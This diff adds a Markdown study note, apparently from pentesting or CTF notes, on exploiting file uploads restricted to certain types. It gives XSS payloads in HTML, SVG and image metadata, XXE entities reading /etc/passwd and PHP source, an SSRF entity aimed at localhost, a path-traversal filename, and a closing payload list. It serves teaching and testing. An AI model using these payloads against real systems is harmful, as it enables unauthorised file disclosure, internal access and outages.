@@ -1,0 +1,459 @@
+# File Upload Attacks – Limited File Uploads
+
+## Overview
+
+Not all upload functionalities allow arbitrary file upload.
+
+Some applications implement strong filtering that restricts uploads to specific file types such as:
+
+- images
+- documents
+- text files
+- structured data formats
+
+Even when arbitrary file upload is not possible, uploaded files may still introduce exploitable vulnerabilities.
+
+Allowed file types can still lead to:
+
+- Stored XSS
+- XXE injection
+- SSRF
+- information disclosure
+- Denial of Service (DoS)
+- application logic abuse
+
+Because of this, identifying allowed extensions is still valuable during testing.
+
+Think of limited file upload as being allowed to bring only certain objects into a building — those objects may still be weaponised creatively.
+
+---
+
+# 1. Why Limited Uploads Are Still Dangerous
+
+Even when script execution is prevented, allowed file formats may:
+
+- execute JavaScript
+- contain XML entities
+- embed remote references
+- trigger parser vulnerabilities
+- cause resource exhaustion
+- manipulate application logic
+
+Common risky formats:
+
+```
+.svg
+.html
+.xml
+.docx
+.xlsx
+.pdf
+.zip
+.jpg
+.png
+.gif
+```
+
+Fuzzing allowed extensions helps identify possible attack paths.
+
+---
+
+# 2. Stored XSS via File Upload
+
+Certain file types allow embedded JavaScript.
+
+If the application displays uploaded content, script execution may occur in the victim's browser.
+
+Stored XSS is triggered when a user accesses the uploaded file.
+
+Potential impact:
+
+- session hijacking
+- CSRF attacks
+- credential theft
+- privilege abuse
+- DOM manipulation
+
+---
+
+# 3. HTML File XSS
+
+If HTML uploads are allowed:
+
+malicious HTML may execute JavaScript.
+
+Example payload:
+
+```html
+<script>alert(window.origin)</script>
+```
+
+Attack scenario:
+
+1. upload malicious HTML file
+2. victim opens trusted application link
+3. JavaScript executes in trusted origin context
+
+Possible impact:
+
+- cookie theft
+- account takeover
+- CSRF exploitation
+
+---
+
+# 4. XSS via Image Metadata
+
+Some applications display image metadata.
+
+Metadata fields can contain arbitrary text.
+
+Example injection using exiftool:
+
+```bash
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+```
+
+Verify metadata:
+
+```bash
+exiftool HTB.jpg
+```
+
+Example output:
+
+```
+Comment : "><img src=1 onerror=alert(window.origin)>
+```
+
+If application displays metadata without sanitisation, JavaScript executes.
+
+---
+
+# 5. XSS via SVG Files
+
+SVG files use XML structure.
+
+SVG supports embedded JavaScript.
+
+Example malicious SVG:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN">
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <rect width="1" height="1" fill="green"/>
+  <script>alert(window.origin)</script>
+</svg>
+```
+
+When SVG rendered in browser:
+
+JavaScript executes.
+
+Impact similar to stored XSS.
+
+---
+
+# 6. XXE via File Upload
+
+XML-based file formats may allow XXE injection.
+
+Common XML-based formats:
+
+```
+.svg
+.xml
+.docx
+.xlsx
+.pptx
+.pdf
+```
+
+XXE allows reading internal files from server.
+
+Example XXE payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg>&xxe;</svg>
+```
+
+When processed by vulnerable parser:
+
+contents of `/etc/passwd` displayed.
+
+---
+
+# 7. Reading Source Code via XXE
+
+PHP wrapper allows base64 encoding.
+
+Example payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<svg>&xxe;</svg>
+```
+
+Output:
+
+base64 encoded source code.
+
+Decode locally:
+
+```bash
+echo BASE64_DATA | base64 -d
+```
+
+Benefits:
+
+- discover hidden endpoints
+- identify credentials
+- locate upload paths
+- identify validation logic
+- discover additional vulnerabilities
+
+---
+
+# 8. SSRF via XML Entities
+
+XXE can also trigger SSRF.
+
+Example entity referencing internal resource:
+
+```xml
+<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">
+```
+
+Potential targets:
+
+```
+localhost services
+internal APIs
+metadata endpoints
+private networks
+```
+
+Possible outcomes:
+
+- access internal services
+- retrieve cloud credentials
+- perform privileged actions
+
+---
+
+# 9. DoS via File Upload
+
+File uploads can trigger Denial of Service.
+
+Common DoS vectors:
+
+- decompression bombs
+- oversized files
+- resource exhaustion
+- parser abuse
+- recursive entities
+- image processing abuse
+
+Impact:
+
+- server crash
+- high CPU usage
+- memory exhaustion
+- storage exhaustion
+- service disruption
+
+---
+
+# 10. ZIP Decompression Bomb
+
+ZIP files may expand massively when decompressed.
+
+Example attack:
+
+nested compressed files expand exponentially.
+
+Small upload may extract into massive data volume.
+
+Example impact:
+
+- disk exhaustion
+- service crash
+- backup failure
+- application downtime
+
+---
+
+# 11. Pixel Flood Attack
+
+Image headers define image dimensions.
+
+Image metadata may specify extremely large dimensions.
+
+Example manipulated image size:
+
+```
+0xffff x 0xffff
+```
+
+Results in extremely large pixel count.
+
+Server attempts to allocate memory.
+
+Possible result:
+
+memory exhaustion and crash.
+
+---
+
+# 12. Large File Upload DoS
+
+If upload size is not restricted:
+
+attacker may upload extremely large files.
+
+Impact:
+
+- disk space exhaustion
+- application slowdown
+- storage failure
+- system instability
+
+Example attack:
+
+upload multiple large files repeatedly.
+
+---
+
+# 13. Directory Traversal Upload
+
+If upload path is vulnerable:
+
+attacker may attempt writing outside intended directory.
+
+Example filename:
+
+```
+../../../etc/passwd
+```
+
+Potential impact:
+
+- overwrite system files
+- modify application files
+- corrupt configurations
+- crash server
+
+Depends on server permissions and validation weaknesses.
+
+---
+
+# 14. Practical Testing Workflow
+
+## Step 1 – identify allowed extensions
+
+Fuzz upload functionality.
+
+## Step 2 – evaluate file processing behaviour
+
+Observe how files are stored or rendered.
+
+## Step 3 – test client-side rendering
+
+Check whether file contents displayed in browser.
+
+## Step 4 – test metadata injection
+
+Inject payloads into metadata fields.
+
+## Step 5 – test XML-based payloads
+
+Attempt XXE exploitation.
+
+## Step 6 – test resource exhaustion attacks
+
+Upload large or malformed files.
+
+## Step 7 – observe application behaviour
+
+Monitor responses and errors.
+
+---
+
+# 15. Useful Payload Examples
+
+## HTML XSS payload
+
+```html
+<script>alert(window.origin)</script>
+```
+
+## image metadata XSS
+
+```bash
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+```
+
+## SVG XSS payload
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>alert(window.origin)</script>
+</svg>
+```
+
+## XXE file read
+
+```xml
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg>&xxe;</svg>
+```
+
+## XXE source disclosure
+
+```xml
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<svg>&xxe;</svg>
+```
+
+---
+
+# 16. Key Takeaways
+
+- arbitrary upload is not required for exploitation
+- allowed file types may still introduce vulnerabilities
+- SVG and XML formats frequently allow injection attacks
+- metadata fields may allow stored XSS
+- XXE may disclose sensitive server files
+- SSRF may expose internal services
+- decompression bombs may crash systems
+- image metadata manipulation may exhaust resources
+- fuzzing allowed extensions helps identify attack surface
+- limited upload functionality still presents risk
+
+---
+
+# Tags
+
+#file-upload
+#xss
+#xxe
+#ssrf
+#dos
+#svg
+#xml
+#metadata
+#pentesting
+#ctf
+#obsidian
